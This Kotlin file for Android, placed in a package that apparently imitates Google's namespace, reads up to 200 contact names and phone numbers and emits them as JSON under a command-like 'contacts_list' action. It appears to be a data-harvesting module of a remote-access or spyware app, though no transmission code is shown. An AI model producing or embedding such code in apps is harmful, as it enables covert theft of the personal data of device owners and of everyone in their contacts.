package com.google.xmodzz

import android.content.Context
import android.provider.ContactsContract
import org.json.JSONArray
import org.json.JSONObject

object ContactsRechive {
    fun listContacts(ctx: Context, emit: (JSONObject) -> Unit) {
        val list = JSONArray()
        val cursor = ctx.contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null, null, null, null
        )
        
        cursor?.use {
            val nameCol = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val numCol = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
            
            while (it.moveToNext() && list.length() < 200) {
                val o = JSONObject()
                o.put("name", it.getString(nameCol) ?: "Unknown")
                o.put("number", it.getString(numCol) ?: "-")
                list.put(o)
            }
        }
        
        emit(JSONObject().put("action", "contacts_list").put("data", list))
    }
}
